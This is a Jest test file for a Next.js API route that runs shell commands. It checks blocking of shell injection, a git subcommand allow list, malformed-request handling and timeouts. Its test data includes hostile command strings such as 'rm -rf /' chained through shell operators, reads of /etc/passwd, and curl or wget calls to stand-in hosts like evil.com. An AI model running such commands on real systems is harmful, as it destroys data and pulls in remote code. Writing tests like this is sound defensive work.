/**
 * @jest-environment node
 */

import { NextRequest } from 'next/server';
import { POST as runCommand } from '../../app/api/run-command/route';

// Mock child_process
jest.mock('child_process');
jest.mock('fs/promises');
jest.mock('../../lib/process-cleanup-manager');

describe.skip('Security and Error Handling', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    
    // Mock fs.access to simulate working directory exists
    const mockFs = require('fs/promises');
    mockFs.access = jest.fn().mockResolvedValue(undefined);
  });

  describe('Command Validation Security', () => {
    it('should block all shell injection attempts', async () => {
      const maliciousCommands = [
        'ls; rm -rf /',
        'ls && rm -rf /',
        'ls || rm -rf /',
        'ls | rm -rf /',
        'ls > /etc/passwd',
        'ls < /etc/passwd',
        'ls `rm -rf /`',
        'ls $(rm -rf /)',
        'ls {rm,rf,/}',
        'ls [a-z]*',
        'npm install; curl http://evil.com',
        'git status && wget http://malware.com',
        'echo test > /tmp/test && cat /etc/passwd'
      ];

      for (const command of maliciousCommands) {
        const request = new NextRequest('http://localhost:3000/api/run-command', {
          method: 'POST',
          body: JSON.stringify({ command }),
          headers: { 'Content-Type': 'application/json' }
        });

        const response = await runCommand(request);
        
        expect(response.status).toBe(403);
        const data = await response.json();
        expect(data.success).toBe(false);
        expect(data.error).toContain('Command blocked');
      }
    });

    it('should validate git subcommands strictly', async () => {
      const allowedGitCommands = [
        'git status',
        'git log',
        'git diff',
        'git show',
        'git branch',
        'git remote'
      ];

      const blockedGitCommands = [
        'git clone https://github.com/evil/repo',
        'git push origin main',
        'git reset --hard HEAD~10',
        'git rm -rf .',
        'git checkout -b new-branch'
      ];

      for (const command of allowedGitCommands) {
        const request = new NextRequest('http://localhost:3000/api/run-command', {
          method: 'POST',
          body: JSON.stringify({ command }),
          headers: { 'Content-Type': 'application/json' }
        });

        const response = await runCommand(request);
        expect(response.status).not.toBe(403);
      }

      for (const command of blockedGitCommands) {
        const request = new NextRequest('http://localhost:3000/api/run-command', {
          method: 'POST',
          body: JSON.stringify({ command }),
          headers: { 'Content-Type': 'application/json' }
        });

        const response = await runCommand(request);
        expect(response.status).toBe(403);
      }
    });

    it('should sanitize environment variables', async () => {
      // Mock child process to simulate successful execution
      const mockSpawn = require('child_process').spawn;
      mockSpawn.mockReturnValue({
        pid: 12345,
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        on: jest.fn().mockImplementation((event, callback) => {
          if (event === 'close') {
            setTimeout(() => callback(0, null), 10);
          }
        }),
        kill: jest.fn()
      });

      const request = new NextRequest('http://localhost:3000/api/run-command', {
        method: 'POST',
        body: JSON.stringify({ command: 'npm list' }),
        headers: { 'Content-Type': 'application/json' }
      });

      const response = await runCommand(request);
      
      // Should not expose sensitive environment variables
      expect(response.status).toBe(200);
    });
  });

  describe('Error Recovery', () => {
    it('should handle working directory validation', async () => {
      // Mock fs.access to simulate directory not existing
      jest.doMock('fs/promises', () => ({
        access: jest.fn().mockRejectedValue(new Error('ENOENT')),
        writeFile: jest.fn(),
        readFile: jest.fn(),
        unlink: jest.fn()
      }));

      const request = new NextRequest('http://localhost:3000/api/run-command', {
        method: 'POST',
        body: JSON.stringify({ command: 'npm install' }),
        headers: { 'Content-Type': 'application/json' }
      });

      const response = await runCommand(request);
      
      expect(response.status).toBe(400);
      const data = await response.json();
      expect(data.error).toContain('Working directory does not exist');
    });

    it('should handle malformed request bodies', async () => {
      const invalidRequests = [
        { body: '{"invalid": json}' },
        { body: '' },
        { body: 'not-json' },
        { body: JSON.stringify({}) }, // Missing command
        { body: JSON.stringify({ command: '' }) }, // Empty command
        { body: JSON.stringify({ command: null }) } // Null command
      ];

      for (const { body } of invalidRequests) {
        const request = new NextRequest('http://localhost:3000/api/run-command', {
          method: 'POST',
          body,
          headers: { 'Content-Type': 'application/json' }
        });

        const response = await runCommand(request);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('Resource Limits', () => {
    it('should enforce timeout limits', async () => {
      const request = new NextRequest('http://localhost:3000/api/run-command', {
        method: 'POST',
        body: JSON.stringify({ 
          command: 'npm install',
          timeout: 50 // Very short timeout
        }),
        headers: { 'Content-Type': 'application/json' }
      });

      const response = await runCommand(request);
      
      expect(response.status).toBe(200);
      const data = await response.json();
      // Should complete quickly due to mocked spawn
      expect(data.duration).toBeLessThan(1000);
    });

    it('should handle memory monitoring', async () => {
      // This would test memory limits in the process cleanup manager
      // For now, we verify that the structure exists
      const request = new NextRequest('http://localhost:3000/api/process-cleanup', {
        method: 'GET'
      });

      // This tests that the API can handle memory-related queries
      expect(request).toBeDefined();
    });
  });
});